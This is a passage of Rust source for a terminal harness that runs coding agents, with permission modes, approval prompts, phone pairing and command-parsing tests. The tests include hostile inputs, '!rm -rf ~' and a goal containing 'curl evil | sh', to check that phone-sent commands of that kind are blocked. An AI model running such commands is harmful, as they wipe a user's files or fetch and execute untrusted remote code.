            config.mcp.insert(name.clone(), server.clone());
        }
    }
    match config.save(&roots.sombre) {
        Ok(()) => {
            view::note(&format!(
                "added {}. sombre's agent connects on its next turn",
                picked.len()
            ));
            true
        }
        Err(error) => {
            view::failed(&format!("couldn't save the servers: {error}"));
            false
        }
    }
}

fn status(engine: &Engine, roots: Option<&Roots>) {
    let mut rows = vec![
        ("agent", engine.name().to_string()),
        (
            "model",
            engine
                .label
                .clone()
                .unwrap_or_else(|| "the agent's default".to_string()),
        ),
        (
            "permissions",
            format!(
                "{}. {}",
                engine.mode.name(),
                about(engine.agent, engine.mode)
            ),
        ),
        (
            "phone",
            match (crate::relay::paired(), crate::relay::devices().len()) {
                (false, _) => "not paired. /pair connects one".to_string(),
                (true, 0) => "waiting for your phone to scan the code".to_string(),
                (true, 1) => "1 phone paired. /pair list shows it".to_string(),
                (true, count) => format!("{count} phones paired. /pair list shows them"),
            },
        ),
        (
            "effort",
            engine
                .effort
                .clone()
                .unwrap_or_else(|| "default".to_string()),
        ),
        ("folder", view::home(&engine.cwd)),
        (
            "chat",
            engine
                .session
                .clone()
                .unwrap_or_else(|| "new, nothing sent yet".to_string()),
        ),
    ];
    if let Some(left) = engine.left {
        rows.push(("context", format!("{left}% left")));
    }
    if let Some(cost) = engine.cost {
        rows.push(("cost", format!("{} this session", view::money(cost))));
    }
    if let Some(roots) = roots {
        rows.push((
            "config",
            view::home(&sombre_harness::config::file(&roots.sombre)),
        ));
    }
    view::table(&rows);
}

pub fn open(session: &Session) -> Option<Engine> {
    if !session.cwd.is_dir() {
        view::failed(&format!(
            "{} no longer exists, so this chat can't continue there",
            session.cwd.display()
        ));
        return None;
    }
    Some(Engine::new(
        session.agent,
        session.cwd.clone(),
        Some(session.id.clone()),
    ))
}

fn footer(engine: &Engine) -> Vec<String> {
    crate::footer::parts(engine)
}

fn screen(engine: &Engine, history: &[Event]) -> usize {
    view::banner();
    view::history(history, &engine.cwd)
}

fn current(engine: &Engine) {
    if let Some(id) = &engine.session {
        crate::relay::follow(&format!("{}:{id}", engine.agent.name()));
    }
}

fn fill(session: Session, shown: usize) {
    std::thread::spawn(move || view::backfill(&transcript(&session), &session.cwd, shown));
}

fn permissions(engine: &Engine) -> Option<Mode> {
    Mode::ALL
        .into_iter()
        .fold(
            crate::menu::select(format!("permissions for {}", engine.name())),
            |menu, mode| {
                let hint = about(engine.agent, mode);
                let hint = if mode == engine.mode {
                    format!("{hint}  current")
                } else {
                    hint.to_string()
                };
                menu.item(mode, mode.name(), hint)
            },
        )
        .initial_value(engine.mode)
        .interact()
        .ok()
}

fn effort(engine: &Engine) -> Option<Option<String>> {
    let current = engine.level().unwrap_or("default").to_string();
    let mark = |name: &str, hint: &str| {
        if name == current {
            format!("{hint}  current").trim().to_string()
        } else {
            hint.to_string()
        }
    };
    let menu = crate::menu::select(format!("reasoning effort for {}", engine.name())).item(
        "default".to_string(),
        "default",
        mark("default", "let the model decide"),
    );
    engine
        .levels()
        .iter()
        .fold(menu, |menu, level| {
            menu.item((*level).to_string(), *level, mark(level, ""))
        })
        .initial_value(current)
        .interact()
        .ok()
        .map(|picked| Some(picked).filter(|picked| picked != "default"))
}

fn strive(engine: &mut Engine, roots: Option<&Roots>, effort: Option<String>) {
    if engine.agent == Agent::Claude {
        engine.stop();
    }
    engine.effort.clone_from(&effort);
    if let Some(roots) = roots {
        let saved = Config::load(&roots.sombre).and_then(|mut config| {
            config.effort.clone_from(&effort);
            config
                .save(&roots.sombre)
                .map_err(|error| format!("couldn't save the effort level: {error}"))
        });
        if let Err(problem) = saved {
            view::failed(&problem);
        }
    }
    view::note(&match effort {
        Some(level) => format!("effort: {level}. sombre uses the closest level each agent takes"),
        None => "effort: default. each model decides how hard to think".to_string(),
    });
}

fn daring() -> bool {
    crate::menu::confirm(
        "yolo lets the agent change any file and run any command on your computer without asking. turn it on?",
    )
    .initial_value(false)
    .interact()
    .unwrap_or(false)
}

fn save(roots: Option<&Roots>, mode: Mode) -> Result<(), String> {
    let Some(roots) = roots else {
        return Ok(());
    };
    Config::load(&roots.sombre).and_then(|mut config| {
        config.permissions = Some(mode);
        config
            .save(&roots.sombre)
            .map_err(|error| format!("couldn't save permissions: {error}"))
    })
}

fn permit(engine: &mut Engine, roots: Option<&Roots>, mode: Mode) {
    engine.shift(mode);
    if let Err(problem) = save(roots, mode) {
        view::failed(&problem);
    }
}

fn trust() -> bool {
    if TRUSTED.load(Ordering::Relaxed) {
        return true;
    }
    let dared = daring();
    TRUSTED.store(dared, Ordering::Relaxed);
    dared
}

fn upcoming(engine: &Engine) -> Option<Mode> {
    let next = engine.mode.next();
    (next != Mode::Yolo || TRUSTED.load(Ordering::Relaxed)).then_some(next)
}

fn cycle(engine: &mut Engine, roots: Option<&Roots>) {
    let mut next = engine.mode.next();
    if next == Mode::Yolo && !trust() {
        next = next.next();
    }
    permit(engine, roots, next);
}

fn allow(engine: &mut Engine, roots: Option<&Roots>, mode: Mode) {
    permit(engine, roots, mode);
    view::note(&format!(
        "permissions: {}. {}",
        mode.name(),
        about(engine.agent, mode)
    ));
}

fn resumed(engine: &mut Engine, history: &[Event], roots: Option<&Roots>) {
    let chat = recorded(history);
    if engine.model.is_none()
        && let Some(model) = chat.as_deref()
    {
        engine.model = kept(engine.agent, model, roots);
        if engine.model.is_none() {
            if engine.agent == Agent::Sombre {
                view::note(&format!(
                    "this chat used {model}, which isn't set up anymore, so it continues on your default model"
                ));
            }
            engine.label = fallback(roots, engine.agent);
            return;
        }
    }
    engine.label = chat.or_else(|| fallback(roots, engine.agent));
}

fn switch(
    engine: &mut Engine,
    models: &mut Vec<String>,
    roots: Option<&Roots>,
    agent: Agent,
    chosen: Option<String>,
) {
    let cwd = engine.cwd.clone();
    let mut history: Vec<Event> = Vec::new();
    let mut session = None;
    let mut message = None;
    if let (Some(roots), Some(current)) = (roots, engine.session.clone())
        && agent != engine.agent
    {
        match carry::ask(engine.agent, agent) {
            carry::Choice::Cancel => return,
            carry::Choice::Fresh => {}
            carry::Choice::Move => {
                engine.stop();
                match carry::run(roots, engine.agent, &current, agent, &cwd) {
                    Ok((moved, replay)) => {
                        message = Some(carry::note(agent, moved.carried));
                        session = Some(moved.session);
                        history = replay;
                    }
                    Err(problem) => {
                        view::failed(&format!("{problem}. the chat stayed where it was"));
                        return;
                    }
                }
            }
        }
    }
    *engine = Engine::new(agent, cwd, session);
    engine.model.clone_from(&chosen);
    engine.label = chosen
        .or_else(|| recorded(&history))
        .or_else(|| fallback(roots, agent));
    if let Some(roots) = roots {
        *models = names(Some(roots), agent);
    }
    view::wipe();
    screen(engine, &history);
    if let Some(message) = message {
        view::note(&message);
    }
}

fn names(roots: Option<&Roots>, agent: Agent) -> Vec<String> {
    let Some(roots) = roots else {
        return Vec::new();
    };
    if agent != Agent::Sombre {
        return roots
            .models(agent)
            .into_iter()
            .map(|model| model.id)
            .collect();
    }
    let Ok(config) = Config::load(&roots.sombre) else {
        return Vec::new();
    };
    let mut known: Vec<String> = config
        .providers
        .iter()
        .flat_map(|(name, provider)| {
            provider
                .models
                .iter()
                .map(move |model| format!("{name}:{model}"))
        })
        .collect();
    known.push(config.model());
    known
}

fn catalog(roots: &Roots, agent: Agent) -> Vec<Model> {
    if agent != Agent::Sombre {
        return roots.models(agent);
    }
    view::spin();
    let found = sombre_engine::catalog(roots, agent);
    view::clear();
    match found {
        Ok((listed, problems)) => {
            for problem in problems {
                view::note(&problem);
            }
            listed
        }
        Err(problem) => {
            view::failed(&problem);
            Vec::new()
        }
    }
}

fn choose(roots: &Roots, engine: &Engine) -> Option<String> {
    let models = catalog(roots, engine.agent);
    if models.is_empty() {
        view::note("no model list found. type /model and a name, like /model gpt-6.1-sol");
        return None;
    }
    let current = engine
        .model
        .clone()
        .or_else(|| fallback(Some(roots), engine.agent));
    let menu = models.iter().fold(
        crate::menu::select(format!("model for {}", engine.name())),
        |menu, model| {
            let hint = if current.as_deref() == Some(model.id.as_str()) {
                format!("{}  current", model.about)
            } else {
                model.about.clone()
            };
            menu.item(model.id.clone(), &model.id, hint)
        },
    );
    let menu = match current.filter(|id| models.iter().any(|model| &model.id == id)) {
        Some(id) => menu.initial_value(id),
        None => menu,
    };
    let menu = if models.len() > 10 {
        menu.filter_mode().max_rows(12)
    } else {
        menu
    };
    menu.interact().ok()
}

fn model(engine: &mut Engine, roots: Option<&Roots>, name: String) {
    engine.stop();
    if engine.agent == Agent::Sombre
        && let Some(roots) = roots
    {
        let saved = Config::load(&roots.sombre).and_then(|mut config| {
            config.model = Some(name.clone());
            config
                .save(&roots.sombre)
                .map_err(|error| format!("couldn't save the model choice: {error}"))
        });
        if let Err(problem) = saved {
            view::failed(&problem);
        }
    }
    view::note(&format!("{} now uses {name}", engine.name()));
    engine.label = Some(name.clone());
    engine.model = Some(name);
}

fn turn(engine: &mut Engine, text: &str, stop: &AtomicBool) -> (Draft, Outcome) {
    let owned = engine.agent == Agent::Claude && text.trim_start().starts_with('/');
    begin(engine, stop, owned, |engine| engine.send(text))
}

fn begin(
    engine: &mut Engine,
    stop: &AtomicBool,
    owned: bool,
    start: impl FnOnce(&mut Engine) -> io::Result<()>,
) -> (Draft, Outcome) {
    stop.store(false, Ordering::SeqCst);
    if let Err(error) = start(engine) {
        view::failed(&format!(
            "couldn't start {}: {error}. is it installed and on your PATH?",
            engine.agent.name()
        ));
        return (
            Draft::default(),
            Outcome {
                failed: true,
                ..Outcome::default()
            },
        );
    }
    watch(engine, stop, owned)
}

struct Kept<'a> {
    composer: &'a mut crate::compose::Composer,
    pending: &'a mut VecDeque<String>,
    draft: &'a mut String,
    held: &'a mut Vec<PathBuf>,
    carried: &'a mut Vec<PathBuf>,
}

fn wake(engine: &mut Engine, stop: &AtomicBool, kept: Kept<'_>) {
    view::line("");
    let (left, _) = watch(engine, stop, true);
    *kept.carried = absorb(left, kept.pending, kept.draft, kept.held);
    if !kept.draft.is_empty() && !kept.composer.text.is_empty() {
        *kept.draft = format!("{} {}", kept.composer.expand(), kept.draft);
    }
}

fn watch(engine: &mut Engine, stop: &AtomicBool, owned: bool) -> (Draft, Outcome) {
    stop.store(false, Ordering::SeqCst);
    let steer = Roots::detect()
        .and_then(|roots| Config::load(&roots.sombre).ok())
        .is_some_and(|config| config.steer);
    let models = names(Roots::detect().as_ref(), engine.agent);
    let mut dock = Dock::open(steer, footer(engine), models);
    let mut prose = view::Prose::default();
    let mut outcome = Outcome::default();
    let teed = view::teeing();
    if teed && let Some(text) = view::untee() {
        crate::relay::post(&serde_json::json!({"kind": "printed", "text": text}));
    }
    let stopped = pump(engine, stop, &mut dock, &mut prose, &mut outcome, owned);
    if teed {
        view::tee();
    }
    outcome.stopped = stopped;
    dock.hide();
    prose.finish();
    let mut left = dock.close();
    if stopped {
        let mut parts = std::mem::take(&mut left.queued);
        parts.push(left.editor.expand());
        let joined = parts
            .into_iter()
            .filter(|part| !part.trim().is_empty())
            .collect::<Vec<_>>()
            .join("\n");
        left.editor.clear();
        left.editor.set(&joined);
    }
    (left, outcome)
}

fn capped(engine: &Engine) -> bool {
    AIMING.load(Ordering::SeqCst) && engine.native() && engine.rounds() > goal::TURNS
}

fn pump(
    engine: &mut Engine,
    stop: &AtomicBool,
    dock: &mut Dock,
    prose: &mut view::Prose,
    outcome: &mut Outcome,
    owned: bool,
) -> bool {
    let started = Instant::now();
    let long = |started: Instant| started.elapsed() >= Duration::from_secs(15);
    let mut errors: Vec<String> = Vec::new();
    let mut streamed = false;
    let mut ours = owned || engine.agent != Agent::Claude;
    let owed = usize::from(!owned);
    let mut halted = false;
    let mut steered = 0usize;
    let mut echoed = 0usize;
    let mut steps: HashMap<String, (String, String)> = HashMap::new();
    let mut last: Option<String> = None;
    let mut streak = Streak::default();
    let mut latest: Option<Vec<(String, String)>> = None;
    loop {
        if sombre_harness::process::hung() {
            dock.hide();
            engine.stop();
            return true;
        }
        while let Some(arrival) = crate::relay::message() {
            dock.hide();
            streak.settle(false, &engine.cwd);
            let crate::relay::Arrival { text, now, images } = arrival;
            if text.trim_start().starts_with(['/', '!']) {
                crate::relay::hold(text);
                crate::relay::post(&serde_json::json!({
                    "kind": "note",
                    "text": "commands run when this turn ends",
                }));
            } else if now && nudge(engine, &text, images.clone()) {
                steered += 1;
            } else {
                let offset = dock.draft.images.len();
                dock.draft.images.extend(images);
                dock.draft.queued.push(crate::attach::shift(&text, offset));
            }
            dock.draw();
        }
        let pressed = dock.keys();
        if let Action::Steer(messages) = &pressed {
            dock.hide();
            streak.settle(false, &engine.cwd);
            let text = messages.join("\n\n");
            let pictured = |part: &str| -> Vec<PathBuf> {
                dock.draft
                    .images
                    .iter()
                    .enumerate()
                    .filter(|(index, _)| part.contains(&format!("[Image #{}]", index + 1)))
                    .map(|(_, path)| path.clone())
                    .collect()
            };
            if engine.steer(&text, &pictured(&text)).unwrap_or(false) {
                steered += 1;
                for message in messages {
                    crate::relay::said(message, &pictured(message));
                    view::steered(message);
                }
            } else {
                dock.draft.queued.extend(messages.iter().cloned());
                view::note(&format!(
                    "{} can't take a message mid-turn here, so it's queued for after",
                    engine.name()
                ));
            }
            dock.draw();
        }
        if pressed == Action::Cycle {
            if upcoming(engine).is_none() {
                dock.hide();
            }
            cycle(engine, Roots::detect().as_ref());
            dock.relabel(footer(engine));
            dock.draw();
        }
        if pressed == Action::Typed {
            dock.draw();
        }
        if stop.swap(false, Ordering::SeqCst) || pressed == Action::Stop {
            dock.hide();
            streak.settle(false, &engine.cwd);
            final_plan(&mut latest, &engine.cwd);
            prose.finish();
            engine.stop();
            if !AIMING.load(Ordering::SeqCst) {
                view::note("stopped");
            }
            return true;
        }
        if view::resized() {
            dock.hide();
            print!("{}", view::replay(Some(prose)));
            streak.show(&engine.cwd);
            dock.stale();
            dock.draw();
        }
        let events = match engine.next(Duration::from_millis(10)) {
            Next::Idle => {
                dock.draw();
                continue;
            }
            Next::Error(line) => {
                errors.push(sombre_core::scrub::scrub(&line));
                continue;
            }
            Next::Closed => {
                dock.hide();
                streak.settle(false, &engine.cwd);
                final_plan(&mut latest, &engine.cwd);
                prose.finish();
                engine.stop();
                let reason = errors
                    .iter()
                    .rev()
                    .find(|line| !line.trim().is_empty())
                    .map_or("the agent stopped without an answer", String::as_str);
                view::failed(reason);
                outcome.failed = true;
                return false;
            }
            Next::Events(events) => events,
        };
        if capped(engine) {
            dock.hide();
            streak.settle(false, &engine.cwd);
            final_plan(&mut latest, &engine.cwd);
            prose.finish();
            engine.stop();
            outcome.limited = true;
            return false;
        }
        for item in events {
            let item = item.scrubbed();
            if ours {
                crate::relay::mirror(&item);
            }
            dock.hide();
            let keep = match &item {
                Event::Output { failed: false, .. }
                | Event::Plan { .. }
                | Event::Step { .. }
                | Event::Image(_)
                | Event::Session(_)
                | Event::Model(_)
                | Event::Echo
                | Event::Prompt(_)
                | Event::Round(_)
                | Event::Goal { .. } => None,
                Event::Output { id, .. } | Event::Patch { id, .. } => {
                    Some(last.as_deref() == Some(id.as_str()))
                }
                Event::Approval { .. } | Event::Questions { .. } => Some(true),
                _ => Some(false),
            };
            if let Some(keep) = keep {
                streak.settle(keep, &engine.cwd);
            }
            if !matches!(item, Event::Delta(_)) && !matches!(item, Event::Text(_) if streamed) {
                prose.finish();
            }
            match item {
                Event::Session(id) => engine.session = Some(id),
                Event::Model(name) => engine.label = Some(name),
                Event::Echo => {
                    ours = true;
                    echoed += 1;
                }
                Event::Note(message) => view::note(&message),
                Event::Prompt(_) | Event::Attached(_) => {}
                Event::Text(_)
                | Event::Delta(_)
                | Event::Step { .. }
                | Event::Output { .. }
                | Event::Patch { .. }
                | Event::Plan { .. }
                | Event::Done { .. }
                | Event::Failed(_)
                    if !ours => {}
                Event::Output { .. } | Event::Patch { .. } if halted => {}
                Event::Delta(text) => {
                    last = None;
                    streamed = true;
                    outcome.said.push_str(&text);
                    prose.push(&text);
                }
                Event::Text(_) if streamed => {
                    streamed = false;
                    prose.finish();
                }
                Event::Text(body) => {
                    last = None;
                    view::text(&body);
                    outcome.said = body;
                }
                Event::Image(path) => {
                    streak.push("View", &path);
                    streak.show(&engine.cwd);
                }
                Event::Step { label, .. } if label == "Plan" => {}
                Event::Step { id, label, detail } => {
                    outcome.steps += 1;
                    outcome.said.clear();
                    streak.push(&label, &detail);
                    streak.show(&engine.cwd);
                    steps.insert(id.clone(), (label, detail));
                    last = Some(id);
                }
                Event::Output { failed: false, .. } => {}
                Event::Output { id, text, failed } => {
                    follow(&id, &mut last, &steps, &engine.cwd);
                    view::output(&text, failed);
                }
                Event::Patch { id, lines } => {
                    follow(&id, &mut last, &steps, &engine.cwd);
                    view::patch(&lines);
                }
                Event::Plan { steps: plan, .. } => {
                    dock.track(view::planned(&plan, &engine.cwd));
                    latest = Some(plan);
                }
                Event::Goal { status, reason } => {
                    outcome.goal = Some((status, reason));
                }
                Event::Round(_) => view::note(&format!(
                    "turn {} of {}, {} keeps going on the goal",
                    engine.rounds(),
                    goal::TURNS,
                    engine.name()
                )),
                Event::Approval { ref id, .. } => {
                    if long(started) {
                        view::notify(&format!("{} needs your approval", engine.name()));
                    }
                    let choice = if covers(engine.mode, &item, &engine.cwd) {
                        approve::granted(engine.mode.name());
                        Choice::Yes
                    } else {
                        dock.wait();
                        let name = engine.name();
                        let cwd = engine.cwd.clone();
                        let mode = engine.mode;
                        approve::ask(name, &item, &cwd, mode, &mut || {
                            cycle(engine, Roots::detect().as_ref());
                            engine.mode
                        })
                    };
                    crate::relay::post(&serde_json::json!({
                        "id": id,
                        "kind": "decided",
                        "yes": choice != Choice::No,
                    }));
                    dock.relabel(footer(engine));
                    if choice == Choice::No {
                        halted = true;
                        outcome.refused = true;
                    }
                    if engine.answer(&item, choice.into()).is_err() {
                        view::failed("the agent stopped before it got the answer");
                        return false;
                    }
                }
                Event::Questions { ref id, .. } => {
                    if long(started) {
                        view::notify(&format!("{} has a question for you", engine.name()));
                    }
                    dock.wait();
                    let answers = crate::question::answer(engine.name(), &item);
                    crate::relay::post(&serde_json::json!({
                        "answers": answers,
                        "id": id,
                        "kind": "answered",
                    }));
                    dock.relabel(footer(engine));
                    if answers.is_none() && engine.agent == Agent::Claude {
                        halted = true;
                        outcome.refused = true;
                    }
                    if engine.reply(&item, answers.as_deref()).is_err() {
                        view::failed("the agent stopped before it got the answer");
                        return false;
                    }
                }
                Event::Done { .. } | Event::Failed(_) if halted => {
                    final_plan(&mut latest, &engine.cwd);
                    view::note(&format!(
                        "stopped. tell {} what to do instead",
                        engine.name()
                    ));
                    return false;
                }
                Event::Done { millis, cost, left } => {
                    final_plan(&mut latest, &engine.cwd);
                    if long(started) {
                        view::notify(&format!("{} finished", engine.name()));
                    }
                    engine.left = left.or(engine.left);
                    let spent = engine.charge(cost);
                    let elapsed = u64::try_from(started.elapsed().as_millis()).ok();
                    crate::relay::post(&serde_json::json!({
                        "cost": spent,
                        "kind": "done",
                        "left": left,
                        "millis": millis.or(elapsed),
                    }));
                    if millis != Some(0) || spent.is_some() {
                        view::done(
                            engine.name(),
                            engine.label.as_deref(),
                            millis.or(elapsed),
                            spent,
                            left,
                        );
                    }
                    if engine.agent == Agent::Claude && echoed < steered + owed {
                        continue;
                    }
                    return false;
                }
                Event::Failed(message) => {
                    final_plan(&mut latest, &engine.cwd);
                    view::failed(&message);
                    outcome.failed = true;
                    return false;
                }
            }
        }
        dock.draw();
    }
}

fn pair(engine: &Engine, roots: Option<&Roots>, command: &str) {
    let words: Vec<&str> = command.split_whitespace().collect();
    match words.as_slice() {
        ["off"] => view::note(if crate::relay::close() {
            "stopped. every paired phone is disconnected"
        } else {
            "no phone is paired"
        }),
        ["list"] => {
            let found = crate::relay::devices();
            if found.is_empty() {
                view::note("no phone is paired. /pair connects one");
                return;
            }
            let now = sombre_core::now();
            let rows: Vec<(String, String)> = found
                .iter()
                .enumerate()
                .map(|(index, device)| {
                    (
                        (index + 1).to_string(),
                        format!(
                            "{}  paired {}",
                            device.label,
                            sombre_core::ago(device.since, now)
                        ),
                    )
                })
                .collect();
            let rows: Vec<(&str, String)> = rows
                .iter()
                .map(|(number, about)| (number.as_str(), about.clone()))
                .collect();
            view::table(&rows);
            view::note("/pair forget <number> disconnects one phone");
        }
        ["forget", number] => {
            let found = crate::relay::devices();
            let picked = number
                .parse::<usize>()
                .ok()
                .and_then(|number| number.checked_sub(1))
                .and_then(|index| found.get(index));
            match picked {
                Some(device) if crate::relay::forget(&device.id, &shared(engine)) => {
                    view::note(&format!(
                        "{} is disconnected and the key changed, so it can't read this chat or send to it anymore",
                        device.label
                    ))
                }
                Some(_) => view::failed("couldn't disconnect that phone"),
                None => view::note("there's no phone with that number. /pair list shows them"),
            }
        }
        [] => {
            let config = roots
                .and_then(|roots| Config::load(&roots.sombre).ok())
                .unwrap_or_default();
            let fresh = !crate::relay::paired();
            let reach = if fresh {
                way(&config)
            } else {
                Some(reached(&config))
            };
            let Some(reach) = reach else {
                return;
            };
            match crate::relay::invite(reach, config.relay.as_deref()) {
                Ok((url, reach)) => {
                    if fresh {
                        for item in shared(engine) {
                            crate::relay::post(&item);
                        }
                    }
                    view::pairing(&url, reach);
                    if crate::clipboard::copy(&url) {
                        view::note("the link is on your clipboard too");
                    }
                }
                Err(problem) => view::failed(&problem),
            }
        }
        _ => view::note("try /pair, /pair list, /pair forget <number>, or /pair off"),
    }
}

fn shared(engine: &Engine) -> Vec<serde_json::Value> {
    let mut items = vec![serde_json::json!({
        "agent": engine.name(),
        "folder": view::home(&engine.cwd),
        "kind": "hello",
        "model": engine.label,
        "name": view::folder(&engine.cwd),
    })];
    items.extend(view::recent(1_000).into_iter().map(|mut item| {
        item["again"] = serde_json::json!(true);
        item
    }));
    items
}

fn absorb(
    left: Draft,
    pending: &mut VecDeque<String>,
    draft: &mut String,
    held: &mut Vec<PathBuf>,
) -> Vec<PathBuf> {
    pending.extend(left.queued);
    *draft = left.editor.expand();
    held.clone_from(&left.images);
    left.images
}

fn nudge(engine: &mut Engine, text: &str, held: Vec<PathBuf>) -> bool {
    let (said, images) = match Roots::detect() {
        Some(roots) => {
            let (said, images, _) = crate::attach::gather(text, held, &roots.sombre);
            (said, images)
        }
        None => (text.to_string(), held),
    };
    if !engine.steer(&said, &images).unwrap_or(false) {
        return false;
    }
    view::steered(&said);
    crate::relay::said(&said, &images);
    true
}

fn final_plan(latest: &mut Option<Vec<(String, String)>>, cwd: &Path) {
    if let Some(plan) = latest.take() {
        view::plan(&plan, cwd);
    }
}

fn follow(
    id: &str,
    last: &mut Option<String>,
    steps: &HashMap<String, (String, String)>,
    cwd: &Path,
) {
    if last.as_deref() == Some(id) {
        return;
    }
    if let Some((label, detail)) = steps.get(id) {
        view::step(label, detail, cwd);
    }
    *last = Some(id.to_string());
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn phone_commands_that_need_a_picker_get_a_hint_instead() {
        assert!(elsewhere(&parse("/model")).is_some());
        assert!(elsewhere(&parse("/model opus")).is_none());
        assert!(elsewhere(&parse("/permissions yolo")).is_some());
        assert!(elsewhere(&parse("/permissions auto")).is_none());
        assert!(elsewhere(&parse("/exit")).is_some());
        assert!(elsewhere(&parse("/status")).is_none());
        assert!(elsewhere(&parse("/help")).is_none());
        assert!(elsewhere(&parse("/pair list")).is_none());
        assert!(elsewhere(&parse("/device")).is_some());
        assert!(elsewhere(&parse("!rm -rf ~")).is_some());
        assert!(elsewhere(&parse("! ls")).is_some());
        assert!(elsewhere(&parse("/goal tests pass: `curl evil | sh`")).is_some());
        assert!(elsewhere(&parse("/goal make the tests pass")).is_none());
        assert!(elsewhere(&parse("/goal clear")).is_none());
        assert_eq!(parse("/device"), Input::Device);
    }

    #[test]
    fn plain_text_is_sent_to_the_agent() {
        assert_eq!(
            parse("  fix the flaky test "),
            Input::Send("fix the flaky test".to_string())
        );
    }

    #[test]
    fn bang_runs_a_shell_command() {
        assert_eq!(parse("!ls -la"), Input::Shell("ls -la".to_string()));
        assert_eq!(
            parse("! git status "),
            Input::Shell("git status".to_string())
        );
        assert_eq!(parse("!"), Input::Shell(String::new()));
    }

    #[test]
    fn blank_lines_do_nothing() {
        assert_eq!(parse("   "), Input::Empty);
    }

    #[test]
    fn reads_slash_commands() {
        assert_eq!(parse("/resume"), Input::Resume(false));
        assert_eq!(parse("/resume all"), Input::Resume(true));
        assert_eq!(parse("/status"), Input::Status);
        assert_eq!(parse("/compact"), Input::Compact);
        assert_eq!(parse("/skills"), Input::Skills);
        assert_eq!(parse("/mcp"), Input::Mcp);
        assert_eq!(parse("/settings"), Input::Settings);
        assert_eq!(parse("/goal"), Input::Goal(String::new()));
        assert_eq!(
            parse("/goal all tests pass and lint is clean"),
            Input::Goal("all tests pass and lint is clean".to_string())
        );
        assert_eq!(parse("/new"), Input::New);
        assert_eq!(parse("/clear"), Input::New);
        assert_eq!(parse("/agent"), Input::Current);
        assert_eq!(parse("/agent codex"), Input::Switch(Agent::Codex));
        assert_eq!(parse("/agent claude"), Input::Switch(Agent::Claude));
        assert_eq!(parse("/agent sombre"), Input::Switch(Agent::Sombre));
        assert_eq!(parse("/provider"), Input::Provider);
        assert_eq!(parse("/permissions"), Input::Permissions(None));
        assert_eq!(parse("/effort"), Input::Effort(None));
        assert_eq!(
            parse("/rename  \"deploy fix\" "),
            Input::Rename("\"deploy fix\"".to_string())
        );
        assert_eq!(parse("/rename"), Input::Rename(String::new()));
        assert_eq!(parse("/pair"), Input::Pair(String::new()));
        assert_eq!(parse("/pair forget 2"), Input::Pair("forget 2".to_string()));
        assert_eq!(
            parse("/effort high"),
            Input::Effort(Some("high".to_string()))
        );
        assert_eq!(
            parse("/permissions yolo"),
            Input::Permissions(Some("yolo".to_string()))
        );
        assert_eq!(parse("/help"), Input::Help);
        assert_eq!(parse("/exit"), Input::Exit);
        assert_eq!(parse("/quit"), Input::Exit);
    }

    #[test]
    fn reads_model_switches() {
        assert_eq!(parse("/model"), Input::Model(None));
        assert_eq!(parse("/model opus"), Input::Model(Some("opus".to_string())));
        assert_eq!(
            parse("/model gpt-6.1-sol"),
            Input::Model(Some("gpt-6.1-sol".to_string()))
        );
        assert_eq!(
            parse("/model a b"),
            Input::Unknown("/model a b".to_string())
        );
    }

    #[test]
    fn flags_unknown_commands() {
        assert_eq!(
            parse("/agent gpt"),
            Input::Unknown("/agent gpt".to_string())
        );
        assert_eq!(parse("/teleport"), Input::Unknown("/teleport".to_string()));
    }

    #[test]
    fn sends_messages_that_start_with_a_path() {
        assert_eq!(
            parse("/src/app.ts has a bug"),
            Input::Send("/src/app.ts has a bug".to_string())
        );
    }
}
